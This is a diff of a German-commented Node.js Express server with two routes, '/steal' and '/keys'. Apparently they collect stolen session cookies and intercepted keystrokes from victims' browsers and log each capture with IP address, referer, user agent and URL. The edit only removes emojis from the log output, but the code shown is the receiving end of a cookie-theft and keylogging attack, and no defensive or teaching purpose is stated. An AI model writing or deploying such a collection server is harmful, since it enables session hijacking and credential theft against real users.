@@ -31,13 +31,13 @@ app.get('/steal', (req, res) => {
 
     // Terminal-Ausgabe
     console.log('\n' + '═'.repeat(70));
-    console.log('🍪 COOKIE-DIEBSTAHL ERKANNT!');
+    console.log('COOKIE-DIEBSTAHL ERKANNT!');
     console.log('═'.repeat(70));
-    console.log('⏰ Zeit:       ', getTimestamp());
-    console.log('🌐 IP-Adresse: ', ip);
-    console.log('🔗 Referer:    ', referer);
-    console.log('💻 User-Agent: ', userAgent);
-    console.log('📦 Cookies:    ', cookieString || '(keine Cookies)');
+    console.log('Zeit: ', getTimestamp());
+    console.log('IP-Adresse: ', ip);
+    console.log('Referer:    ', referer);
+    console.log('User-Agent: ', userAgent);
+    console.log('Cookies:    ', cookieString || '(keine Cookies)');
     console.log('═'.repeat(70) + '\n');
 
     // Einfache Antwort
@@ -52,13 +52,13 @@ app.get('/keys', (req, res) => {
 
     // Terminal-Ausgabe
     console.log('\n' + '═'.repeat(70));
-    console.log('⌨️  TASTATUREINGABE ABGEFANGEN!');
+    console.log(' TASTATUREINGABE ABGEFANGEN!');
     console.log('═'.repeat(70));
-    console.log('⏰ Zeit:       ', getTimestamp());
-    console.log('🌐 IP-Adresse: ', ip);
-    console.log('📍 URL:        ', url);
-    console.log('⌨️  Eingabe:    ', keys);
-    console.log('📏 Länge:      ', keys.length, 'Zeichen');
+    console.log('Zeit: ', getTimestamp());
+    console.log('IP-Adresse: ', ip);
+    console.log('URL:        ', url);
+    console.log('Eingabe:    ', keys);
+    console.log('Länge:      ', keys.length, 'Zeichen');
     console.log('═'.repeat(70) + '\n');
 
     // Einfache Antwort
